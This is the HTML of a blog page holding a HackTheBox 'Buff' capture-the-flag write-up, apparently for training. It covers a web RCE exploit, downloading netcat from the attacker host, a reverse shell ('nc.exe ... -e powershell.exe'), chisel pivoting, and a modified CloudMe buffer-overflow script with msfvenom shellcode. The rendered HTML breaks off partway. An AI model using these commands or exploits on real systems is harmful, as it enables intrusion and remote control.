<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Buff | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="Buff HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/buff/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/buff/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Buff "><meta property="og:description" content="Buff HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/buff/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/buff/buff.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-11-20T21:08:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/buff/buff.png"><meta name=twitter:title content="Buff "><meta name=twitter:description content="Buff HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Buff ","item":"https://s4ch.github.io/writeups/hackthebox/buff/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Buff ","name":"Buff ","description":"Buff HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"Information Name: Buff Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap lynx exploitdb ffuf windows-binaries pwncat chisel Network enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.80 scan initiated Mon Nov 2 19:24:39 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up (0.077s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 7680/tcp open pando-pub? 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 2 19:31:30 2020 -- 1 IP address (1 host up) scanned in 411.20 seconds HTTP enumeration List the links in the homepage.\n1 2 3 4 5 6 7 8 9 10 11 $ lynx -dump -listonly -nonumbers http://10.10.10.198:8080/ http://10.10.10.198:8080/ http://10.10.10.198:8080/ http://10.10.10.198:8080/packages.php http://10.10.10.198:8080/facilities.php http://10.10.10.198:8080/about.php http://10.10.10.198:8080/contact.php http://10.10.10.198:8080/packages.php http://10.10.10.198:8080/packages.php http://10.10.10.198:8080/facilities.php http://10.10.10.198:8080/facilities.php However is doesn’t show http://10.10.10.198:8080/include/process_login.php\nLet’s see if there is more pages with ffuf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 $ ffuf -u http://10.10.10.198:8080/FUZZ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.198:8080/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-files-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ home.php [Status: 200, Size: 143, Words: 18, Lines: 3] register.php [Status: 200, Size: 137, Words: 23, Lines: 4] contact.php [Status: 200, Size: 4169, Words: 798, Lines: 119] index.php [Status: 200, Size: 4969, Words: 935, Lines: 134] feedback.php [Status: 200, Size: 4252, Words: 760, Lines: 114] . [Status: 200, Size: 4969, Words: 935, Lines: 134] upload.php [Status: 200, Size: 107, Words: 12, Lines: 3] edit.php [Status: 200, Size: 4282, Words: 844, Lines: 122] about.php [Status: 200, Size: 5316, Words: 999, Lines: 142] up.php [Status: 200, Size: 209, Words: 23, Lines: 5] profile. [Status: 301, Size: 346, Words: 22, Lines: 10] packages.php [Status: 200, Size: 7787, Words: 2315, Lines: 169] :: Progress: [10848/10848] :: Job [1/1] :: 75 req/sec :: Duration: [0:03:06] :: Errors: 0 :: I discovered a lot of promising pages: register, feedback, upload, edit, up, profile.\nBy submitting erroneous stuff at the edit page I obtained a full path disclosure: C:\\xampp\\htdocs\\gym\\editp.php\nAlso a HTTP error is disclosing the versions: Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)\nOn the contact page we can see: Made using Gym Management Software 1.0 .\nHTTP exploitation It seems it really exists:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $ searchsploit Gym Management ------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------ --------------------------------- Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py ------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results $ searchsploit -p 48506 Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48506 Path: /usr/share/exploitdb/exploits/php/webapps/48506.py File Type: Python script, ASCII text executable, with CRLF line terminators $ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py Traceback (most recent call last): File \"/usr/share/exploitdb/exploits/php/webapps/48506.py\", line 38, in \u003cmodule\u003e from colorama import Fore, Back, Style ImportError: No module named colorama $ sudo pacman -S python2-colorama --asdeps $ python2 /usr/share/exploitdb/exploits/php/webapps/48506.py http://10.10.10.198:8080/ /\\ /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================\" \\/ [+] Successfully connected to webshell. C:\\xampp\\htdocs\\gym\\upload\u003e C:\\xampp\\htdocs\\gym\\upload\u003e whoami PNG buff\\shaun Upgrading from a webshell to a reverse shell I should have a pre-compiled netcat for windows:\n1 2 3 4 5 $ pacman -Ql windows-binaries | grep nc windows-binaries /usr/share/windows/windows-binaries/nc.exe windows-binaries /usr/share/windows/windows-binaries/nc.txt windows-binaries /usr/share/windows/windows-binaries/ncat.exe windows-binaries /usr/share/windows/windows-binaries/vncviewer.exe Even better I have ncat. Let’s share it via a web server.\n1 2 3 $ cp /usr/share/windows/windows-binaries/ncat.exe . $ ruby -run -ehttpd . -p8080 Need a listener:\n1 $ pwncat -l 9999 -vv Download it via the webshell (curl the powershell alias as we are on windows):\n1 curl http://10.10.14.146:8080/ncat.exe --output ncat.exe Ncat wasn’t working so I retried with nc.\n1 2 curl http://10.10.14.146:8080/nc.exe --output nc.exe nc.exe 10.10.14.146 9999 -e powershell.exe 1 2 3 4 5 PS C:\\xampp\\htdocs\\gym\\upload\u003e whoami buff\\shaun PS C:\\xampp\\htdocs\\gym\\upload\u003e gc C:\\Users\\shaun\\Desktop\\user.txt f03b243a0738b73cb640ee8b7b1928d7 Privilege Escalation of Machine : from shaun to administrator Check for restricted services from the outside\nRef. HackTricks - Windows Local Privilege Escalation - Open Ports\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 PS C:\\xampp\\htdocs\\gym\\upload\u003e netstat -ano netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 960 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 5672 TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING 8564 TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 3176 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 528 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1088 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1548 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 2160 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 668 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 688 ... TCP 127.0.0.1:3306 0.0.0.0:0 LISTENING 4736 TCP 127.0.0.1:3306 127.0.0.1:50755 TIME_WAIT 0 TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 644 ... We have a MySQL server and an unknown service running locally. We may need some pivoting technique to access it (see Network pivoting state of the art - Chisel - Reverse remote port forwarding).\n[chisel] is one of the best tool out there for pivoting and it has a pre-compiled windows binary.\n1 $ 7z e chisel_1.7.2_windows_amd64.gz Start the server on your machine:\n1 2 3 4 $ chisel server -p 8080 --host 10.10.14.188 --reverse -v 2020/11/04 20:55:17 server: Reverse tunnelling enabled 2020/11/04 20:55:17 server: Fingerprint 67:21:79:97:03:c3:a6:2f:bd:d7:b9:c7:d9:1d:35:47 2020/11/04 20:55:17 server: Listening on 10.10.14.188:8080.. Upload the binary \u0026 execute the client:\n1 2 3 4 5 6 7 8 PS C:\\xampp\\htdocs\\gym\\upload\u003e curl http://10.10.14.188:8080/chisel.exe --output cyfun.exe PS C:\\xampp\\htdocs\\gym\\upload\u003e .\\cyfun.exe client -v http://10.10.14.188:8080 R:127.0.0.1:44444:127.0.0.1:8888 2020/11/04 20:05:19 client: Connecting to ws://10.10.14.188:8080 2020/11/04 20:05:20 client: Handshaking... 2020/11/04 20:05:20 client: Fingerprint 1a:a8:a6:b7:c1:58:25:d7:b0:9d:c4:51:4e:8f:b2:5e 2020/11/04 20:05:20 client: Sending config 2020/11/04 20:05:20 client: Connected (Latency 64.5615ms) 2020/11/04 20:05:20 client: tun: SSH connected But we have no clue what service is behind this port:\n1 2 3 4 5 6 7 8 9 10 $ nmap 127.0.0.1 -p 44444 -sVC Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-04 21:02 CET Nmap scan report for localhost (127.0.0.1) Host is up (0.000080s latency). PORT STATE SERVICE VERSION 44444/tcp open tcpwrapped Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds The only hint we have is on the Download folder:\n1 2 3 4 5 6 7 8 9 10 11 12 C:\\xampp\\htdocs\\gym\\upload\u003e dir C:\\users\\shaun\\Downloads\\ Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\\users\\shaun\\Downloads 14/07/2020 12:27 \u003cDIR\u003e . 14/07/2020 12:27 \u003cDIR\u003e .. 16/06/2020 15:26 17,830,824 CloudMe_1112.exe 1 File(s) 17,830,824 bytes 2 Dir(s) 7,130,439,680 bytes free This CloudMe seems a little bit vulnerable:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ searchsploit cloudme ----------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------- --------------------------------- CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR) | windows/local/48499.txt Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit) | windows_x86-64/remote/45197.rb CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass) | windows_x86-64/local/45159.py CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit) | windows/remote/44175.rb CloudMe Sync 1.11.0 - Local Buffer Overflow | windows/local/44470.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py CloudMe Sync \u003c 1.11.0 - Buffer Overflow | windows/remote/44027.py CloudMe Sync \u003c 1.11.0 - Buffer Overflow (SEH) (DEP Bypass) | windows_x86-64/remote/44784.py ----------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results $ searchsploit -p 48389 Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC) URL: https://www.exploit-db.com/exploits/48389 Path: /usr/share/exploitdb/exploits/windows/remote/48389.py File Type: ASCII text, with CRLF line terminators Let’s see this BoF exploit:\n1 2 $ cp /usr/share/exploitdb/exploits/windows/remote/48389.py . $ nvim 48389.py It seems the embedded shellcode is only making appear calc.exe, we need a reverse shell instead. The last option is to name the variable payload instead of buf.\n1 $ msfvenom -p windows/exec CMD='C:\\xampp\\htdocs\\gym\\upload\\nc.exe 10.10.14.188 9999 -e powershell.exe' -b '\\x00\\x0A\\x0D' -f python -v payload The whole modified exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 # Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC) # Date: 2020-04-27 # Exploit Author: Andy Bowden # Vendor Homepage: https://www.cloudme.com/en # Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe # Version: CloudMe 1.11.2 # Tested on: Windows 10 x86 #Instructions: # Start the CloudMe service and run the script. import socket target = \"127.0.0.1\" padding1 = b\"\\x90\" * 1052 EIP = b\"\\xB5\\x42\\xA8\\x68\" # 0x68A842B5 -\u003e PUSH ESP, RET NOPS = b\"\\x90\" * 30 #msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\\x00\\x0A\\x0D' -f python payload = b\"\" payload += b\"\\xdb\\xd3\\xbf\\x10\\x10\\x1f\\x4e\\xd9\\x74\\x24\\xf4\\x5e\" payload += b\"\\x2b\\xc9\\xb1\\x42\\x83\\xc6\\x04\\x31\\x7e\\x14\\x03\\x7e\" payload += b\"\\x04\\xf2\\xea\\xb2\\xcc\\x70\\x14\\x4b\\x0c\\x15\\x9c\\xae\" payload += b\"\\x3d\\x15\\xfa\\xbb\\x6d\\xa5\\x88\\xee\\x81\\x4e\\xdc\\x1a\" payload += b\"\\x12\\x22\\xc9\\x2d\\x93\\x89\\x2f\\x03\\x24\\xa1\\x0c\\x02\" payload += b\"\\xa6\\xb8\\x40\\xe4\\x97\\x72\\x95\\xe5\\xd0\\x6f\\x54\\xb7\" payload += b\"\\x89\\xe4\\xcb\\x28\\xbe\\xb1\\xd7\\xc3\\x8c\\x54\\x50\\x37\" payload += b\"\\x44\\x56\\x71\\xe6\\xdf\\x01\\x51\\x08\\x0c\\x3a\\xd8\\x12\" payload += b\"\\x51\\x07\\x92\\xa9\\xa1\\xf3\\x25\\x78\\xf8\\xfc\\x8a\\x45\" payload += b\"\\x35\\x0f\\xd2\\x82\\xf1\\xf0\\xa1\\xfa\\x02\\x8c\\xb1\\x38\" payload += b\"\\x79\\x4a\\x37\\xdb\\xd9\\x19\\xef\\x07\\xd8\\xce\\x76\\xc3\" payload += b\"\\xd6\\xbb\\xfd\\x8b\\xfa\\x3a\\xd1\\xa7\\x06\\xb6\\xd4\\x67\" payload += b\"\\x8f\\x8c\\xf2\\xa3\\xd4\\x57\\x9a\\xf2\\xb0\\x36\\xa3\\xe5\" payload += b\"\\x1b\\xe6\\x01\\x6d\\xb1\\xf3\\x3b\\x2c\\xdf\\x02\\xc9\\x4a\" payload += b\"\\xad\\x05\\xd1\\x54\\x81\\x6d\\xe0\\xdf\\x4e\\xe9\\xfd\\x35\" payload += b\"\\x2b\\x05\\xb4\\x14\\x1d\\x8e\\x11\\xcd\\x1c\\xd3\\xa1\\x3b\" payload += b\"\\x62\\xea\\x21\\xce\\x1a\\x09\\x39\\xbb\\x1f\\x55\\xfd\\x57\" payload += b\"\\x6d\\xc6\\x68\\x58\\xc2\\xe7\\xb8\\x3b\\x8b\\x67\\x3a\\x9c\" payload += b\"\\x10\\xb2\\xe0\\xa9\\xe5\\xa7\\x6a\\x21\\x55\\x69\\xef\\xa8\" payload += b\"\\x0c\\x07\\x86\\x41\\xba\\xa5\\x39\\xd2\\x2d\\x38\\xe6\\x7e\" payload += b\"\\xd4\\xcf\\x7d\\x0b\\x79\\x40\\xde\\x81\\xea\\xcf\\xaa\\x4b\" payload += b\"\\x80\\x77\\x27\\xb4\\x2b\\xb2\\x9b\\xc1\\xd8\\xa7\\x51\\x59\" payload += b\"\\x42\\x5b\\xfe\\xfc\\x0f\\xf5\\xa2\\xa8\\x86\\x6d\\x3e\\x3a\" payload += b\"\\x2b\\x32\\xae\\xab\\xb9\\xab\\x44\\x1a\\x49\\x54\\xed\\x62\" overrun = b\"C\" * (1500 - len(padding1 + NOPS + EIP + payload))\tbuf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,44444)) s.send(buf) except Exception as e: print(sys.exc_value) I had no luck with the previous payload so I tried others:\n1 2 msfvenom -p windows/exec CMD='copy C:\\users\\Administrator\\desktop\\root.txt C:\\users\\shaun\\Videos\\cyfun.txt' -b '\\x00\\x0A\\x0D' -f python -v payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.188 LPORT=9999 -b '\\x00\\x0A\\x0D' -f python -v payload I had more luck with windows/shell_reverse_tcp but it was just service being unstable. It’s possible the 1st exploit tentative made the service partially crash.\n1 2 3 4 5 6 7 8 9 10 11 12 $ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.198:49704 (family 2/IPv4, TCP) Microsoft Windows [Version 10.0.17134.1610] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami buff\\administrator C:\\Windows\\system32\u003etype c:\\users\\Administrator\\desktop\\root.txt ccf880bd191ba6b99c413b3855a8bb6d ","wordCount":"1815","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/buff/buff.png","datePublished":"2020-11-20T21:08:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/buff/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Buff</h1><div class=post-description>Buff HackTheBox writeup</div><div class=post-meta><span title='2020-11-20 21:08:00 +0000 UTC'>November 20, 2020</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1815 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/windows/ class=post-tag title=windows>windows</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/buff/buff.png alt="Buff HackTheBox Machine"><p>Buff - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation>HTTP exploitation</a></li><li><a href=#upgrading-from-a-webshell-to-a-reverse-shell>Upgrading from a webshell to a reverse shell</a></li><li><a href=#privilege-escalation-of-machine--from-shaun-to-administrator>Privilege Escalation of Machine : from shaun to administrator</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Buff</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/263>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap lynx exploitdb ffuf windows-binaries pwncat chisel
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with <a href=https://nmap.org/>nmap</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Mon Nov  2 19:24:39 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.198
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.198
</span></span><span class=line><span class=cl>Host is up (0.077s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 filtered ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE    VERSION
</span></span><span class=line><span class=cl>7680/tcp open  pando-pub?
</span></span><span class=line><span class=cl>8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>| http-open-proxy: Potentially OPEN proxy.
</span></span><span class=line><span class=cl>|_Methods supported:CONNECTION
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
</span></span><span class=line><span class=cl>|_http-title: mrb3n&#39;s Bro Hut
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Mon Nov  2 19:31:30 2020 -- 1 IP address (1 host up) scanned in 411.20 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>List the links in the homepage.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ lynx -dump -listonly -nonumbers http://10.10.10.198:8080/
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/packages.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/facilities.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/about.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/contact.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/packages.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/packages.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/facilities.php
</span></span><span class=line><span class=cl>http://10.10.10.198:8080/facilities.php
</span></span></code></pre></td></tr></table></div></div><p>However is doesn&rsquo;t show http://10.10.10.198:8080/include/process_login.php</p><p>Let&rsquo;s see if there is more pages with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
